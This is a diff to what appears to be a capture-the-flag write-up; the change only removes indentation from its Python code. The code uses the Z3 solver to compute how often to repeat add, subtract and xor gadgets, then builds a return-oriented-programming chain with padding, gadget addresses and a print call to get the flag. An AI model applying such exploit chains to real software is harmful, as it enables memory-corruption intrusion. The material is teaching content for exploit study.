@@ -106,16 +106,16 @@ Our strategy now is to build up this equation using Z3 symbols, then throw the e
 The first thing we want to do is to set up our symbols. We'll use Z3's `BitVec`tors to create our unknown 16-bit unsigned integers $m_i, n_i, p_i$. Why 16 bits? Because the gadgets operate on the `ax` register, which is only 16 bits wide.
 
 ```py
-    from z3 import *
+from z3 import *
 
-    # Create 16-bit BVs. m_i denotes the number of times we apply the a_i gadget.
-    add_vars = [BitVec(f'm_{i}', 16) for i in range(len(add_gadgets))] # m
-    sub_vars = [BitVec(f'n_{i}', 16) for i in range(len(sub_gadgets))] # n
-    xor_vars = [BitVec(f'p_{i}', 16) for i in range(len(xor_gadgets))] # p
+# Create 16-bit BVs. m_i denotes the number of times we apply the a_i gadget.
+add_vars = [BitVec(f'm_{i}', 16) for i in range(len(add_gadgets))] # m
+sub_vars = [BitVec(f'n_{i}', 16) for i in range(len(sub_gadgets))] # n
+xor_vars = [BitVec(f'p_{i}', 16) for i in range(len(xor_gadgets))] # p
 
-    # Address containing the `mov rax, XXX; ret` gadget.
-    init_rax_addr = 0x401004
-    rax_init_value = elf.u16(init_rax_addr + 3)
+# Address containing the `mov rax, XXX; ret` gadget.
+init_rax_addr = 0x401004
+rax_init_value = elf.u16(init_rax_addr + 3)
 ```
 
 Keep in mind that these are all symbols, not concrete values.
@@ -134,68 +134,68 @@ Now we have everything we need to construct our [equation](#equation). We have:
 We can begin constructing constraints and feeding things to a Z3 solver!
 
 ```py
-    # Create solver.
-    s = Solver()
+# Create solver.
+s = Solver()
 
-    add_terms = [v * BitVecVal(g['const'], 16) for v, g in zip(add_vars, add_gadgets)]
-    sub_terms = [v * BitVecVal(g['const'], 16) for v, g in zip(sub_vars, sub_gadgets)]
-    xor_terms = [v * BitVecVal(g['const'], 16) for v, g in zip(xor_vars, xor_gadgets)]
+add_terms = [v * BitVecVal(g['const'], 16) for v, g in zip(add_vars, add_gadgets)]
+sub_terms = [v * BitVecVal(g['const'], 16) for v, g in zip(sub_vars, sub_gadgets)]
+xor_terms = [v * BitVecVal(g['const'], 16) for v, g in zip(xor_vars, xor_gadgets)]
 
-    # XOR everything in xor_terms.
-    from functools import reduce
-    xor_all = reduce(lambda x, y: x ^ y, xor_terms)
+# XOR everything in xor_terms.
+from functools import reduce
+xor_all = reduce(lambda x, y: x ^ y, xor_terms)
 
-    # Add base constraint which ties everything together.
-    s.add(BitVecVal(rax_init_value, 16) + Sum(add_terms) - Sum(sub_terms) == BitVecVal(target, 16) ^ xor_all)
+# Add base constraint which ties everything together.
+s.add(BitVecVal(rax_init_value, 16) + Sum(add_terms) - Sum(sub_terms) == BitVecVal(target, 16) ^ xor_all)
 ```
 
 But this constraint isn't enough. Without other constraints, Z3 would return ginormous values which technically satisfy the equation. But there's no way we can call a gadget 1851138 times or -29301 times. We'll need some constraints to limit the values the symbols can take on.
 
 ```py
-    # Bounds constraints.
-    addsub_limit = 100
-    s.add(And([ULT(bv, addsub_limit) for bv in add_vars]))
-    s.add(And([ULT(bv, addsub_limit) for bv in sub_vars]))
-    s.add(And([ULE(bv, 1) for bv in xor_vars]))   # Boolean property.
+# Bounds constraints.
+addsub_limit = 100
+s.add(And([ULT(bv, addsub_limit) for bv in add_vars]))
+s.add(And([ULT(bv, addsub_limit) for bv in sub_vars]))
+s.add(And([ULE(bv, 1) for bv in xor_vars]))   # Boolean property.
 
-    # Limitting constraint. Total number of gadgets shouldn't exceed a limit.
-    gadget_limit = 400 # 4000 bytes limit divide by 8 bytes per gadget.
-    s.add(1 + Sum(add_vars) + Sum(sub_vars) + Sum(xor_vars) <= gadget_limit)
+# Limitting constraint. Total number of gadgets shouldn't exceed a limit.
+gadget_limit = 400 # 4000 bytes limit divide by 8 bytes per gadget.
+s.add(1 + Sum(add_vars) + Sum(sub_vars) + Sum(xor_vars) <= gadget_limit)
 ```
 
 Now that we limit our gadgets properly, we can move on to our final step: evaluation. We'll kindly ask Z3 to spit out a solution, and construct our payload.
 
 ```py
-    # Check satisfiability (and also compute a solution).
-    if s.check() != sat:
-        raise RuntimeError('unable to satisfy constraints')
-    m = s.model()
+# Check satisfiability (and also compute a solution).
+if s.check() != sat:
+    raise RuntimeError('unable to satisfy constraints')
+m = s.model()
 
-    # Initialise rax first. (8 byte padding for rbp.)
-    chain = b'A'*8 + p64(init_rax_addr)
+# Initialise rax first. (8 byte padding for rbp.)
+chain = b'A'*8 + p64(init_rax_addr)
 
-    # Chain add gadgets.
-    for bv, g in zip(add_vars, add_gadgets):
-        chain += p64(g['vaddr']) * m.evaluate(bv).as_long()
-        # m.evaluate(bv).as_long()...
-        #   == 0 => nothing is added to the chain.
-        #   == 1 => call (chain) gadget once.
-        #   == 2 => call (chain) gadget twice.
-        #   etc...
+# Chain add gadgets.
+for bv, g in zip(add_vars, add_gadgets):
+    chain += p64(g['vaddr']) * m.evaluate(bv).as_long()
+    # m.evaluate(bv).as_long()...
+    #   == 0 => nothing is added to the chain.
+    #   == 1 => call (chain) gadget once.
+    #   == 2 => call (chain) gadget twice.
+    #   etc...
 
-    # Chain subtract gadgets.
-    for bv, g in zip(sub_vars, sub_gadgets):
-        chain += p64(g['vaddr']) * m.evaluate(bv).as_long()
+# Chain subtract gadgets.
+for bv, g in zip(sub_vars, sub_gadgets):
+    chain += p64(g['vaddr']) * m.evaluate(bv).as_long()
 
-    # Chain xor gadgets.
-    for bv, g in zip(xor_vars, xor_gadgets):
-        chain += p64(g['vaddr']) * m.evaluate(bv).as_long()
+# Chain xor gadgets.
+for bv, g in zip(xor_vars, xor_gadgets):
+    chain += p64(g['vaddr']) * m.evaluate(bv).as_long()
 
-    # Finally call print.
-    chain += p64(elf.sym['print'])
+# Finally call print.
+chain += p64(elf.sym['print'])
 
-    # And we're done!
-    return chain
+# And we're done!
+return chain
 ```
 
 After modifying the template code to use this procedure, running the code and waiting for a bit, we soon end up with the flag!
